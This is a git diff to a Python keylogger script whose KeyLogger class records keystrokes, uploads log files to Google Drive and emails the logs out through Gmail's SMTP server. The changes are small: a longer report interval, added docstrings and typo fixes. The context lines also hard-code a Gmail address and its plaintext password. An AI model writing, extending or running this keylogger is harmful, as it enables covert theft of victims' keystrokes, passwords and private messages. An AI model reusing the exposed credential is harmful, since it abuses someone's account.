@@ -7,7 +7,7 @@ from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
 
 # initializing parameters
-SEND_REPORT_EVERY = 17  # seconds
+SEND_REPORT_EVERY = 30  # seconds
 EMAIL_ADDRESS = "pythonkeylogger21@gmail.com"
 EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"
 
@@ -41,7 +41,10 @@ class KeyLogger:
 
         self.log += name  # add to total log
 
-    def update_filename(self):  # for filename to refelct start & end datetimes
+    def update_filename(self):
+        """
+        Filename is updated to refelct start & end datetimes
+        """
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
@@ -62,6 +65,12 @@ class KeyLogger:
         gfile.Upload()
 
     def sendmail(self, email, password, message):
+        """
+        Send email to sotred email address
+        :param email: email to send send logs to
+        :param password: password for above email
+        :param message: current key logs
+        """
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages connection to SMTP server
         server.starttls()  # connect to the SMTP server as TLS mode (for security)
         server.login(email, password)  # login to email
@@ -98,6 +107,6 @@ class KeyLogger:
 
 if __name__ == "__main__":
     # keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want the log to be recrd to a local file
+    # if you want the log to be recorded to a local file
     keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
